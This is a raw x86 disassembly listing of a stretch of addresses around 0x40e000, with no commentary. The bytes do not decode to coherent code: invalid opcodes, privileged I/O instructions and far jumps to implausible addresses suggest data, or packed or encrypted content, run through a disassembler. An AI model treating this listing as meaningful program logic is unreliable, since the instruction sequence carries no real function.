  40dfd0:	jmp    0x40dfab
  40dfd2:	icebp  
  40dfd3:	std    
  40dfd4:	sbb    bh,ch
  40dfd6:	or     eax,0x36e36e60
  40dfdb:	push   0xffffff9c
  40dfdd:	adc    al,0x67
  40dfdf:	pushf  
  40dfe0:	push   ebx
  40dfe1:	mov    esi,0x3d588b79
  40dfe6:	in     al,0xab
  40dfe8:	add    al,bh
  40dfea:	sub    dl,BYTE PTR [ebp+0x4c392eec]
  40dff0:	lea    edx,es:[edi+0x3db8dc89]
  40dff7:	mov    dl,0x7d
  40dff9:	test   eax,0x134d9d80
  40dffe:	and    esi,0x3f
  40e001:	and    BYTE PTR [ecx],bl
  40e003:	aaa    
  40e004:	repnz xlat BYTE PTR ds:[ebx]
  40e006:	mov    al,0xa9
  40e008:	pop    ds
  40e009:	pop    esi
  40e00a:	sar    DWORD PTR [ecx+0x35],1
  40e00d:	in     eax,dx
  40e00e:	sbb    BYTE PTR [ecx-0x7a4e0a5a],ah
  40e014:	sbb    BYTE PTR [esi],dh
  40e016:	std    
  40e017:	test   BYTE PTR [esi-0x5630df93],0x6e
  40e01e:	mov    esp,0xf7cc9254
  40e023:	(bad)  
  40e024:	lahf   
  40e025:	mov    edx,0x7330cd51
  40e02a:	aas    
  40e02b:	jg     0x40e02c
  40e02d:	test   eax,0x27d62955
  40e032:	pop    eax
  40e033:	sbb    eax,0xe4ac9c77
  40e038:	rcl    BYTE PTR [eiz*4-0x7df4b37d],1
  40e03f:	sub    edx,DWORD PTR [esi]
  40e041:	cmp    DWORD PTR [edi],0xffffffa2
  40e044:	jmp    0xc6a3ce2a
  40e049:	or     al,dh
  40e04b:	mov    ebp,0x315728b9
  40e050:	stos   DWORD PTR es:[edi],eax
  40e051:	xor    bl,BYTE PTR [ebx-0x72]
  40e054:	push   edi
  40e055:	fwait
  40e056:	loopne 0x40e0a1
  40e058:	addr16 pushf 
  40e05a:	mov    esi,0x146ab144
  40e05f:	pop    ebp
  40e060:	lods   eax,DWORD PTR ds:[esi]
  40e061:	sub    BYTE PTR [eax+0x3402e83e],ch
  40e067:	hlt    
  40e068:	rcr    ebx,0xdc
  40e06b:	nop
  40e06c:	mov    ebx,0xbe64f45b
  40e071:	(bad)  
  40e072:	dec    ebx
  40e073:	pop    ss
  40e074:	cmp    esp,ebp
  40e076:	nop
  40e077:	mov    ch,0x5d
  40e07a:	aad    0xf6
  40e07c:	and    BYTE PTR [ecx],ah
  40e07e:	es jne 0x40e022
  40e081:	pop    ds
  40e082:	pushf  
  40e083:	pop    ecx
  40e084:	jge    0x40e095
  40e086:	push   ecx
  40e087:	jmp    0x40e08d
  40e089:	add    BYTE PTR [ebx-0x12ffec7f],0xa
  40e090:	jge    0x40e0e5
  40e092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e093:	mov    bl,0x36
  40e095:	mov    ecx,0xa62f0205
  40e09a:	adc    ebx,DWORD PTR [esi+eax*1]
  40e09d:	xor    BYTE PTR [ebx-0xc05c1b2],0x7
  40e0a4:	sub    edx,DWORD PTR [ebx]
  40e0a6:	mov    eax,ds:0x889c6f7c
  40e0ab:	stc    
  40e0ac:	mov    BYTE PTR [esi+0x2b9b83f6],bl
  40e0b2:	dec    edi
  40e0b3:	scas   al,BYTE PTR es:[edi]
  40e0b4:	xlat   BYTE PTR ds:[ebx]
  40e0b5:	fs test al,0x69
  40e0b8:	fisub  WORD PTR [ebx+ecx*1]
  40e0bb:	jl     0x40e137
  40e0bd:	jg     0x40e106
  40e0bf:	or     al,0xaf
  40e0c1:	in     al,0xc7
  40e0c3:	in     ax,dx
  40e0c5:	(bad)  
  40e0c7:	sar    DWORD PTR [ebx-0x1c],1
  40e0ca:	xor    eax,0xce37f106
  40e0cf:	push   esi
  40e0d0:	rcr    DWORD PTR [ebx],0x1a
  40e0d3:	wbinvd 
  40e0d5:	jns    0x40e138
  40e0d7:	data16 clc 
  40e0d9:	imul   esi,DWORD PTR [esi+0x32],0x25
  40e0dd:	mov    ebx,0x1df0f937
  40e0e2:	fisttp QWORD PTR [bx+di+0x4caa]
  40e0e7:	dec    eax
  40e0e8:	sbb    al,0x71
  40e0ea:	cmp    ch,BYTE PTR [ebp-0x4f]
  40e0ed:	int3   
  40e0ee:	cdq    
  40e0ef:	xchg   esi,eax
  40e0f0:	(bad)  
  40e0f1:	cmp    eax,0x97a5da8e
  40e0f6:	nop
  40e0f7:	push   ebx
  40e0f8:	push   ebx
  40e0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0fa:	in     al,dx
  40e0fb:	jbe    0x40e164
  40e0fd:	rcl    esp,cl
  40e0ff:	hlt    
  40e100:	aad    0x33
  40e102:	sbb    eax,ebx
  40e104:	ins    BYTE PTR es:[edi],dx
  40e105:	xchg   ebx,eax
  40e106:	push   es
  40e107:	popf   
  40e108:	ss stos DWORD PTR es:[edi],eax
  40e10a:	es outs dx,DWORD PTR fs:[esi]
  40e10d:	jbe    0x40e175
  40e10f:	push   cs
  40e110:	in     al,0x2e
  40e112:	xlat   BYTE PTR ds:[ebx]
  40e113:	neg    BYTE PTR [edi]
  40e115:	jp     0x40e115
  40e117:	xchg   edi,eax
  40e118:	pop    ebp
  40e119:	ja     0x40e17c
  40e11b:	icebp  
  40e11c:	sub    BYTE PTR [esi-0xa139bb3],bh
  40e122:	cmp    bh,0xc
  40e125:	das    
  40e126:	dec    edx
  40e127:	mov    bl,0x19
  40e129:	cmp    al,0xce
  40e12b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e12d:	or     ch,BYTE PTR [esi+0x872b5e8]
  40e133:	aad    0xc1
  40e135:	mov    DWORD PTR [ebp+0x21],ebx
  40e138:	aad    0xe4
  40e13a:	adc    al,0x15
  40e13c:	hlt    
  40e13d:	clc    
  40e13e:	dec    eax
  40e13f:	jns    0x40e15c
  40e141:	mov    dl,0xfc
  40e143:	inc    esi
  40e144:	xor    esi,DWORD PTR [eax+0x2b]
  40e147:	popa   
  40e148:	into   
  40e149:	in     al,dx
  40e14a:	jp     0x40e0e0
  40e14c:	popf   
  40e14d:	aad    0xbb
  40e14f:	lods   eax,DWORD PTR ds:[esi]
  40e150:	sbb    eax,0x6d73e247
  40e155:	test   DWORD PTR [ebx-0x3a],ebx
  40e158:	or     dl,bl
  40e15a:	mov    dl,0xcd
  40e15c:	mov    ebp,0x6e6125dd
  40e161:	and    dl,BYTE PTR [edi-0x13e5b0e9]
  40e167:	sbb    eax,0x2a90e1e4
  40e16c:	cmp    cl,BYTE PTR [eax+0x41]
  40e16f:	shl    BYTE PTR [eax],1
  40e171:	ins    DWORD PTR es:[edi],dx
  40e172:	push   ebp
  40e173:	test   BYTE PTR [esi-0x28a2d046],dl
  40e179:	test   DWORD PTR [edx],edx
  40e17b:	jle    0x40e143
  40e17d:	idiv   DWORD PTR [ebx]
  40e17f:	xchg   ebx,eax
  40e180:	inc    ebx
  40e181:	jecxz  0x40e165
  40e183:	sbb    eax,DWORD PTR [edx+0x45]
  40e186:	(bad)  
  40e188:	push   ebp
  40e189:	into   
  40e18a:	aad    0xcc
  40e18c:	inc    ecx
  40e18d:	not    bl
  40e18f:	adc    DWORD PTR [edi-0x5f],ebx
  40e192:	cld    
  40e193:	push   eax
  40e194:	lea    ebp,[ebp-0x49354ff6]
  40e19a:	into   
  40e19b:	cs out dx,al
  40e19d:	mov    eax,0x589eeb31
  40e1a2:	ins    DWORD PTR es:[edi],dx
  40e1a3:	in     al,0xee
  40e1a5:	mov    DWORD PTR [edx-0x54],0xf88134cb
  40e1ac:	cs push ss
  40e1ae:	in     al,dx
  40e1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b0:	pop    ecx
  40e1b1:	lods   eax,DWORD PTR ds:[esi]
  40e1b2:	inc    ecx
  40e1b3:	cmp    dh,bl
  40e1b5:	scas   al,BYTE PTR es:[edi]
  40e1b6:	push   edx
  40e1b7:	add    eax,0x4cde169b
  40e1bc:	shl    BYTE PTR [ebx],1
  40e1be:	aam    0xaf
  40e1c0:	stos   DWORD PTR es:[edi],eax
  40e1c1:	inc    eax
  40e1c2:	repnz sti 
  40e1c4:	push   0xa77d0026
  40e1c9:	sub    DWORD PTR [eax+esi*1-0x2d16ad00],0xa6c3c24b
  40e1d4:	data16 mov dl,0x4e
  40e1d7:	inc    ebx
  40e1d8:	imul   eax,DWORD PTR [edi+0x32],0xdd66fb52
  40e1df:	in     eax,0xe4
  40e1e1:	mov    ecx,0x5c652cc5
  40e1e6:	cmc    
  40e1e7:	and    ah,BYTE PTR [ebp+0x700bbbf0]
  40e1ed:	sbb    DWORD PTR [edx+0x37b06528],esp
  40e1f3:	in     al,dx
  40e1f4:	je     0x40e222
  40e1f6:	mov    ds:0x1ad45157,eax
  40e1fb:	mov    ecx,0x9b91c5dd
  40e200:	repnz push ss
  40e202:	(bad)  
  40e203:	clc    
  40e204:	sbb    DWORD PTR [ecx+0x6e],edi
  40e207:	idiv   BYTE PTR [esp+ebx*4+0x4d]
  40e20b:	mov    ds:0xb64b1887,al
  40e210:	fmul   QWORD PTR [edi+0x285d4e6b]
  40e216:	sbb    al,0x16
  40e218:	dec    eax
  40e219:	aaa    
  40e21a:	mov    eax,0x752f6a9d
  40e21f:	sub    al,0x6e
  40e221:	pop    edi
  40e222:	js     0x40e266
  40e224:	mov    cl,BYTE PTR [ecx]
  40e226:	sub    al,0x5b
  40e228:	std    
  40e229:	leave  
  40e22a:	mov    eax,0xe47c2a54
  40e22f:	and    al,0x9
  40e231:	ins    DWORD PTR es:[edi],dx
  40e232:	ret    0xfce6
  40e235:	out    dx,eax
  40e236:	retf   
  40e237:	xor    BYTE PTR [ebx+ebx*8],0x6e
  40e23b:	fidiv  DWORD PTR [esp+esi*1-0x8]
  40e23f:	aaa    
  40e240:	shl    DWORD PTR [ebx-0x4a995d07],0x10
  40e247:	jno    0x40e272
  40e249:	pavgb  mm7,QWORD PTR [ebp-0x1f]
  40e24d:	out    0x43,al
  40e24f:	xchg   ebx,eax
  40e250:	int    0x3
  40e252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e253:	fisttp WORD PTR [edi]
  40e255:	or     DWORD PTR [ecx+0x7bbe95c2],esi
  40e25b:	std    
  40e25c:	(bad)  [esi]
  40e25e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e25f:	hlt    
  40e260:	xor    eax,0x81f21b8a
  40e265:	adc    al,0xc7
  40e267:	dec    esp
  40e268:	mov    al,ds:0x980f38f8
  40e26d:	lods   al,BYTE PTR ds:[esi]
  40e26e:	mov    bl,BYTE PTR [esi]
  40e270:	and    eax,0x728a423c
  40e275:	inc    eax
  40e276:	out    dx,eax
  40e277:	ins    DWORD PTR es:[edi],dx
  40e278:	push   ds
  40e279:	pop    ds
  40e27a:	push   ss
  40e27b:	cwde   
  40e27c:	mov    ah,0x45
  40e27e:	fstp   DWORD PTR [ecx+0x57c214db]
  40e284:	stc    
  40e285:	jge    0x40e2ba
  40e287:	outs   dx,DWORD PTR ds:[esi]
  40e288:	aam    0x7b
  40e28a:	pop    edi
  40e28b:	dec    esi
  40e28c:	cdq    
  40e28d:	scas   al,BYTE PTR es:[edi]
  40e28e:	push   ebx
  40e28f:	xchg   esp,eax
  40e290:	jne    0x40e231
  40e292:	dec    ebp
  40e293:	not    esi
  40e295:	(bad)  
  40e296:	add    dh,BYTE PTR fs:[ecx]
  40e299:	pop    ebp
  40e29a:	aad    0xf0
  40e29c:	arpl   cx,bx
  40e29e:	div    DWORD PTR [ebx]
  40e2a0:	push   eax
  40e2a1:	sbb    ecx,esp
  40e2a3:	mov    DWORD PTR [esi],esi
  40e2a5:	inc    esi
  40e2a6:	fisubr WORD PTR [esi-0xd9c134f]
  40e2ac:	dec    ebx
  40e2ad:	lea    ecx,[esi-0x75dae55a]
  40e2b3:	std    
  40e2b4:	frstor [ecx+0x7e948afe]
  40e2ba:	mov    ecx,0x5c204436
  40e2bf:	pop    ebx
  40e2c0:	push   ebp
  40e2c1:	jbe    0x40e28d
  40e2c3:	cli    
  40e2c4:	mov    ds:0xb86597cd,al
  40e2c9:	sbb    ecx,esi
  40e2cb:	(bad)  
  40e2cc:	xchg   esi,eax
  40e2cd:	xchg   esp,eax
  40e2ce:	jno    0x40e264
  40e2d0:	mov    al,ds:0xf12f24d5
  40e2d5:	popf   
  40e2d6:	xchg   ecx,eax
  40e2d7:	ror    DWORD PTR [ecx-0x3fa60b1e],1
  40e2dd:	fwait
  40e2de:	adc    cl,BYTE PTR [edx-0x33a9a682]
  40e2e4:	fisubr DWORD PTR [esi-0x24]
  40e2e7:	push   edx
  40e2e8:	mov    esi,0x556ca096
  40e2ed:	aad    0x73
  40e2ef:	je     0x40e348
  40e2f1:	stos   DWORD PTR es:[edi],eax
  40e2f2:	pop    esi
  40e2f3:	shl    DWORD PTR [ecx],1
  40e2f5:	outs   dx,BYTE PTR ds:[esi]
  40e2f6:	loopne 0x40e307
  40e2f8:	push   edi
  40e2f9:	sub    eax,0xe9f5a0c3
  40e2fe:	pop    esp
  40e2ff:	in     al,dx
  40e300:	lea    esi,[esi]
  40e302:	push   esp
  40e303:	mov    esp,0x43f733e5
  40e308:	xchg   edx,eax
  40e309:	and    BYTE PTR ds:0x34396fb7,bh
  40e30f:	mov    esi,ebx
  40e311:	call   0xb39e:0x3894e821
  40e318:	mov    ah,0x3a
  40e31a:	fnstcw WORD PTR [ebx+edx*2-0x1]
  40e31e:	xor    eax,0x66bd6149
  40e323:	repnz inc edx
  40e325:	add    esi,eax
  40e327:	loop   0x40e322
  40e329:	sti    
  40e32a:	lea    ebx,[ebp-0x37]
  40e32d:	mov    edx,0x7f226b7c
  40e332:	jge    0x40e30b
  40e334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e335:	fisub  DWORD PTR [esi]
  40e337:	inc    ebp
  40e338:	sub    al,0xe4
  40e33a:	cmp    esi,DWORD PTR [ebp-0x55707281]
  40e340:	mov    ah,0x23
  40e342:	jnp    0x40e338
  40e344:	xchg   BYTE PTR [edi],ah
  40e346:	sbb    esi,eax
  40e348:	cmp    al,0xd6
  40e34a:	push   eax
  40e34b:	adc    DWORD PTR [eax+0x12],edi
  40e34e:	lahf   
  40e34f:	pop    ss
  40e350:	lock (bad) 
  40e352:	xor    bh,BYTE PTR [edx+0x69835599]
  40e358:	push   ds
  40e359:	std    
  40e35a:	popa   
  40e35b:	cmp    eax,0x9057ce37
  40e360:	je     0x40e396
  40e362:	sbb    BYTE PTR [eax+0xb],0xd
  40e366:	iret   
  40e367:	arpl   WORD PTR [eax+0x40],di
  40e36a:	cwde   
  40e36b:	or     ebx,esp
  40e36d:	imul   eax,DWORD PTR [eax],0xf2ff0a75
  40e373:	or     al,0x32
  40e375:	adc    dl,BYTE PTR [esi-0x10]
  40e378:	out    0x11,eax
  40e37a:	sbb    esi,DWORD PTR [edx+0x4a]
  40e37d:	pop    es
  40e37e:	(bad)  
  40e37f:	outs   dx,BYTE PTR ds:[esi]
  40e380:	mov    WORD PTR [edx],es
  40e382:	repz xchg ebp,eax
  40e384:	mov    ah,0x8f
  40e386:	scas   eax,DWORD PTR es:[edi]
  40e387:	xor    al,0x5c
  40e389:	lods   eax,DWORD PTR ds:[esi]
  40e38a:	scas   al,BYTE PTR es:[edi]
  40e38b:	mov    al,ds:0x6fbdcc9f
  40e390:	mov    ds:0xd0808c00,eax
  40e395:	adc    eax,esp
  40e397:	out    0xa8,eax
  40e399:	push   ebp
  40e39a:	fimul  DWORD PTR [edi]
  40e39c:	aas    
  40e39d:	adc    DWORD PTR [ebx-0x70],0x7c692d28
  40e3a4:	pop    ebx
  40e3a5:	jno    0x40e334
  40e3a7:	in     al,dx
  40e3a8:	push   ds
  40e3a9:	(bad)  
  40e3aa:	xchg   ebx,eax
  40e3ab:	lds    ebp,FWORD PTR [edx-0x29cee6bf]
  40e3b1:	jmp    0x7782:0xfb05720a
  40e3b8:	xchg   ecx,eax
  40e3b9:	mov    cs,ecx
  40e3bb:	sbb    dh,BYTE PTR [ecx+edi*1+0x7b]
  40e3bf:	icebp  
  40e3c0:	retf   
  40e3c1:	int3   
  40e3c2:	out    dx,al
  40e3c3:	pop    ecx
  40e3c4:	lods   al,BYTE PTR ds:[esi]
  40e3c5:	call   0xda63b688
  40e3ca:	push   esp
  40e3cb:	lea    esi,[ecx+0x7d0fcd9c]
  40e3d1:	ja     0x40e3d5
  40e3d3:	test   BYTE PTR [ebp-0x532829a9],bh
  40e3d9:	sbb    dl,dh
  40e3db:	(bad)  
  40e3dd:	pop    ebx
  40e3de:	repnz lds ebx,FWORD PTR [ebx]
  40e3e1:	or     al,0x7b
  40e3e3:	lods   al,BYTE PTR ds:[esi]
  40e3e4:	int3   
  40e3e5:	inc    esi
  40e3e6:	in     al,0x97
  40e3e8:	clc    
  40e3e9:	adc    edi,DWORD PTR [esi+ecx*1+0x23]
  40e3ed:	and    al,0xf
  40e3ef:	sahf   
  40e3f0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e3f2:	xchg   ebx,eax
  40e3f3:	or     BYTE PTR [edx+0x77e6d94f],cl
  40e3f9:	xchg   ebp,eax
  40e3fa:	and    eax,0x772a725
  40e3ff:	mov    cl,0x5
  40e401:	and    ebx,DWORD PTR [edi-0x3d]
  40e404:	fs cwde 
  40e406:	in     al,dx
  40e407:	in     eax,dx
  40e408:	(bad)  
  40e40a:	aas    
  40e40b:	xchg   ebp,eax
  40e40c:	inc    edx
  40e40d:	ins    BYTE PTR es:[edi],dx
  40e40e:	mov    esp,0xe54b50e0
  40e413:	pop    es
  40e414:	inc    ecx
  40e415:	iret   
  40e416:	dec    ebx
  40e417:	inc    edx
  40e418:	dec    esi
  40e419:	lds    esi,FWORD PTR [edi+eax*4-0x3e]
  40e41d:	push   es
  40e41e:	xchg   esi,eax
  40e41f:	mov    eax,fs
  40e421:	mov    al,ds:0x2d997d09
  40e426:	(bad)  
  40e427:	cdq    
  40e428:	(bad)  
  40e429:	adc    esp,esi
  40e42b:	push   edi
  40e42c:	sbb    dh,dh
  40e42e:	adc    DWORD PTR [ebx+0x5e],0xabd02d83
  40e435:	cs sub al,0x93
  40e438:	mov    edi,0x4df81513
  40e43d:	enter  0xe329,0x5c
  40e441:	mov    al,ds:0x51778c51
  40e446:	or     eax,DWORD PTR ds:0x8da43c17
  40e44c:	outs   dx,BYTE PTR ds:[esi]
  40e44d:	dec    eax
  40e44e:	(bad)  
  40e44f:	dec    ebx
  40e450:	std    
  40e451:	and    eax,0xd836f70a
  40e456:	jo     0x40e4ce
  40e458:	int3   
  40e459:	and    esi,DWORD PTR [eax]
  40e45b:	fst    QWORD PTR [eax+edi*1]
  40e45e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40e460:	push   ecx
  40e461:	ret    0x219e
  40e464:	add    edx,0x9bf2716b
  40e46a:	mov    al,ds:0x52749576
  40e46f:	pop    ss
  40e470:	in     al,0xa9
  40e472:	fldenv [ebp-0x547c1319]
  40e478:	sub    al,0x69
  40e47a:	rcr    BYTE PTR [edx],cl
  40e47c:	lds    ecx,FWORD PTR [edi-0x3b]
  40e47f:	xchg   ebx,eax
  40e480:	add    ecx,DWORD PTR [edi-0x6ab6f165]
  40e486:	or     ecx,DWORD PTR [ebx]
  40e488:	sbb    al,0xc1
  40e48a:	test   eax,0x87f5940d
  40e48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e490:	or     DWORD PTR [ecx+0x51e88c3e],ebp
  40e496:	add    edi,0xffffff8d
  40e499:	outs   dx,DWORD PTR ds:[esi]
  40e49a:	push   edx
  40e49b:	cli    
  40e49c:	sbb    edx,eax
  40e49e:	or     cl,bl
  40e4a0:	ins    DWORD PTR es:[edi],dx
  40e4a1:	jp     0x40e4b1
  40e4a3:	mov    dh,BYTE PTR [edx-0x7c]
  40e4a6:	sbb    BYTE PTR [ecx+0x3b],al
  40e4a9:	popf   
  40e4aa:	mov    ecx,0xe5fcff4e
  40e4af:	pop    esp
  40e4b0:	xor    bh,BYTE PTR [ecx+0x39]
  40e4b3:	test   al,0xa6
  40e4b5:	or     edi,DWORD PTR [ebx-0x59d504e]
  40e4bb:	xor    edi,DWORD PTR [ecx]
  40e4bd:	sub    DWORD PTR [edi+esi*1+0xe],0x90aba098
  40e4c5:	fnstsw ax
  40e4c7:	ins    DWORD PTR es:[edi],dx
  40e4c8:	fsubr  DWORD PTR [edx+0x1c]
  40e4cb:	xor    bl,cl
  40e4cd:	and    esi,DWORD PTR [eax]
  40e4cf:	dec    edx
  40e4d0:	xor    ch,BYTE PTR [eax+0x77]
  40e4d3:	mov    WORD PTR [edi],cs
  40e4d5:	jl     0x40e52b
  40e4d7:	xor    ah,BYTE PTR [ebx-0x57]
  40e4da:	add    DWORD PTR [esi-0x4e],0x948eec41
  40e4e1:	dec    esp
  40e4e2:	std    
  40e4e3:	jle    0x40e47b
  40e4e5:	es dec esi
  40e4e7:	or     al,0xa8
  40e4e9:	mov    dl,0x2c
  40e4eb:	xchg   ecx,eax
  40e4ec:	jbe    0x40e567
  40e4ee:	mov    bh,0xfc
  40e4f0:	mov    bh,BYTE PTR [edi-0x71973016]
  40e4f6:	mov    ch,ch
  40e4f8:	ja     0x40e531
  40e4fa:	ror    BYTE PTR ss:0x71d37502,cl
  40e501:	hlt    
  40e502:	xor    BYTE PTR fs:[edi],0x5f
  40e506:	lock add ebx,DWORD PTR [edi+0x4edfceb9]
  40e50d:	sti    
  40e50e:	pop    ebx
  40e50f:	mov    dl,0x67
  40e511:	ds pop eax
  40e513:	mov    cl,bh
  40e515:	js     0x40e57c
  40e517:	lods   al,BYTE PTR ds:[si]
  40e519:	push   ecx
  40e51a:	fmul   QWORD PTR [ebx]
  40e51c:	dec    eax
  40e51d:	cmp    cl,ah
  40e51f:	das    
  40e520:	imul   edi,DWORD PTR [ebp-0x32],0xba7fa27a
  40e527:	fmul   QWORD PTR [esi-0x2a]
  40e52a:	repz retf 
  40e52c:	test   eax,0x695bde14
  40e531:	enter  0xc268,0x29
  40e535:	imul   edx,DWORD PTR [edi],0xffffffd5
  40e538:	pop    eax
  40e539:	test   BYTE PTR [esi-0x7d],0x26
  40e53d:	push   edi
  40e53e:	mov    bh,0x3d
  40e540:	or     DWORD PTR [ebx],ebp
  40e542:	and    eax,0xb64212bf
  40e547:	and    ebp,DWORD PTR [edx+ecx*2]
  40e54a:	popf   
  40e54b:	lahf   
  40e54c:	test   BYTE PTR [edx+0x1a],bh
  40e54f:	xor    DWORD PTR ds:0x86a7460a,esi
  40e555:	call   0x69f7:0xb4aa0ba8
  40e55c:	scas   al,BYTE PTR es:[edi]
  40e55d:	inc    ebp
  40e55e:	lahf   
  40e55f:	pop    ds
  40e560:	mov    al,ds:0x43ae4a48
  40e565:	cmp    dh,BYTE PTR [ebp-0x7f]
  40e568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e569:	and    bh,BYTE PTR [edx+ecx*1]
  40e56c:	cmp    ch,bh
  40e56e:	mov    dl,0x5d
  40e570:	pop    es
  40e571:	push   es
  40e572:	xchg   esi,eax
  40e573:	mov    eax,edx
  40e575:	leave  
  40e576:	(bad)  
  40e578:	mov    ds:0x76d6c681,al
  40e57d:	jmp    0xb01105be
  40e582:	test   BYTE PTR [edx],ah
  40e584:	push   esi
  40e585:	push   ebx
  40e586:	test   eax,0xf8ddd92b
  40e58b:	outs   dx,BYTE PTR ds:[esi]
  40e58c:	push   ss
  40e58d:	sti    
  40e58e:	ja     0x40e5fb
  40e590:	pusha  
  40e591:	nop
  40e592:	repz test al,0x91
  40e595:	jle    0x40e570
  40e597:	outs   dx,BYTE PTR ds:[esi]
  40e598:	test   edx,0xf42124b3
  40e59e:	sub    edx,DWORD PTR [eax]
  40e5a0:	push   ebp
  40e5a1:	jno    0x40e549
  40e5a3:	cmp    dh,BYTE PTR [ebx-0x38]
  40e5a6:	jmp    0xa4abeb60
  40e5ab:	jne    0x40e570
  40e5ad:	fisubr WORD PTR [eax]
  40e5af:	add    al,0xe5
  40e5b1:	or     eax,0xa81a492a
  40e5b6:	ins    BYTE PTR es:[edi],dx
  40e5b7:	jp     0x40e597
  40e5b9:	add    ch,ah
  40e5bb:	or     BYTE PTR [edi],dh
  40e5bd:	neg    BYTE PTR [ebx+0x7aefa71a]
  40e5c3:	out    dx,al
  40e5c4:	nop
  40e5c5:	inc    ebp
  40e5c6:	cli    
  40e5c7:	outs   dx,BYTE PTR ds:[esi]
  40e5c8:	ja     0x40e5c5
  40e5ca:	stos   DWORD PTR es:[edi],eax
  40e5cb:	add    DWORD PTR [eax-0x26],ecx
  40e5ce:	jo     0x40e59d
  40e5d0:	shr    BYTE PTR [ebx+0x6a742afc],0xb9
  40e5d7:	lods   eax,DWORD PTR ds:[esi]
  40e5d8:	je     0x40e648
  40e5da:	add    esp,DWORD PTR [esi]
  40e5dc:	xchg   DWORD PTR [edi+0x6235e98b],ebp
  40e5e2:	clc    
  40e5e3:	fwait
  40e5e4:	loope  0x40e663
  40e5e6:	inc    esp
  40e5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5e8:	adc    esi,DWORD PTR [esi+0x74]
  40e5eb:	popf   
  40e5ec:	aam    0x1
  40e5ee:	mov    ebp,0xef0a1f4d
  40e5f3:	sbb    ch,0x46
  40e5f6:	sbb    edi,DWORD PTR [edi]
  40e5f8:	mov    bl,BYTE PTR [ebp+0x5]
  40e5fb:	(bad)  
  40e5fc:	jmp    DWORD PTR [ebx+0x250acc26]
  40e602:	adc    bh,BYTE PTR [ecx+eiz*1-0x67ca1155]
  40e609:	jbe    0x40e5b4
  40e60b:	xor    bh,al
  40e60d:	sbb    ah,BYTE PTR [edi+0x5d]
  40e610:	push   ebp
  40e611:	add    DWORD PTR [eax-0x8],ebp
  40e614:	pop    edi
  40e615:	push   eax
  40e616:	repnz cmp ecx,DWORD PTR [ebx]
  40e619:	cmovge ecx,ebx
  40e61c:	jl     0x40e65a
  40e61e:	ins    BYTE PTR es:[edi],dx
  40e61f:	cmp    bl,bl
  40e621:	adc    al,0x4
  40e623:	dec    ecx
  40e624:	pop    esi
  40e625:	dec    ebp
  40e626:	scas   eax,DWORD PTR es:[edi]
  40e627:	sub    al,0x65
  40e629:	popa   
  40e62a:	jl     0x40e604
  40e62c:	xchg   BYTE PTR [ebx+esi*4],dh
  40e62f:	adc    eax,0xf640539
  40e634:	dec    esp
  40e635:	(bad)  
  40e636:	cld    
  40e637:	push   ecx
  40e638:	xor    BYTE PTR [ecx+0x238b92a],dh
  40e63e:	jbe    0x40e656
  40e640:	cli    
  40e641:	adc    ah,BYTE PTR [esi+0x215842b0]
  40e647:	ret    
  40e648:	clc    
  40e649:	mov    ds:0x75e2b191,al
  40e64e:	int    0x10
  40e650:	shr    BYTE PTR [ebp-0x7c],cl
  40e653:	jmp    0x63cae78d
  40e658:	pop    esi
  40e659:	int3   
  40e65a:	or     ch,BYTE PTR [edi+0x1d0ea37f]
  40e660:	in     eax,dx
  40e661:	mov    eax,ds:0x6fac9c87
  40e666:	js     0x40e639
  40e668:	rcl    ah,cl
  40e66a:	les    edi,FWORD PTR [ecx+0xc]
  40e66d:	jecxz  0x40e6c7
  40e66f:	into   
  40e670:	aad    0x5d
  40e672:	cmp    cl,BYTE PTR [ecx-0x50]
  40e675:	jmp    0xc006f74b
  40e67a:	lods   eax,DWORD PTR ds:[esi]
  40e67b:	shl    BYTE PTR [esi+0x4916b9aa],cl
  40e681:	gs fcmove st,st(0)
  40e684:	xchg   ecx,eax
  40e685:	out    0x3d,eax
  40e687:	js     0x40e644
  40e689:	les    esp,FWORD PTR [eax-0x15]
  40e68c:	call   0xc45:0x59b00ed7
  40e693:	shl    BYTE PTR [ecx-0x3d],1
  40e696:	mov    dh,0xab
  40e698:	loop   0x40e6f0
  40e69a:	fdivr  QWORD PTR [esi-0x77139fac]
  40e6a0:	sbb    DWORD PTR [eax+edi*4-0x5464d49a],ebp
  40e6a7:	or     DWORD PTR [edi-0x35],edi
  40e6aa:	xchg   esi,eax
  40e6ab:	and    DWORD PTR [eax-0x47b98610],0xa2a8bebf
  40e6b5:	and    eax,0x2f429243
  40e6ba:	cmp    eax,0xfeb36ded
  40e6bf:	jecxz  0x40e6c6
  40e6c1:	gs bnd ret 
  40e6c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6c5:	scas   eax,DWORD PTR es:[edi]
  40e6c6:	xchg   ebx,eax
  40e6c7:	lods   al,BYTE PTR ds:[esi]
  40e6c8:	pop    ds
  40e6c9:	mov    edx,DWORD PTR [edi+0x79]
  40e6cc:	pop    ss
  40e6cd:	mov    ah,0xff
  40e6cf:	pop    esp
  40e6d0:	pop    ebp
  40e6d1:	sub    DWORD PTR [ebx+ebp*4],ebx
  40e6d4:	(bad)  
  40e6d5:	jno    0x40e6c0
  40e6d7:	push   ds
  40e6d8:	outs   dx,DWORD PTR ds:[esi]
  40e6d9:	jmp    0x40e756
  40e6db:	lods   al,BYTE PTR ds:[esi]
  40e6dc:	ins    BYTE PTR es:[edi],dx
  40e6dd:	dec    esp
  40e6de:	jmp    0xf8d7:0x10cc634
  40e6e5:	xchg   edi,eax
  40e6e6:	add    dh,al
  40e6e8:	pop    ebx
  40e6e9:	stos   BYTE PTR es:[edi],al
  40e6ea:	jge    0x40e729
  40e6ec:	adc    ecx,DWORD PTR [esi-0x42]
  40e6ef:	pusha  
  40e6f0:	sub    al,0xdb
  40e6f2:	mov    al,ds:0x4d2d104b
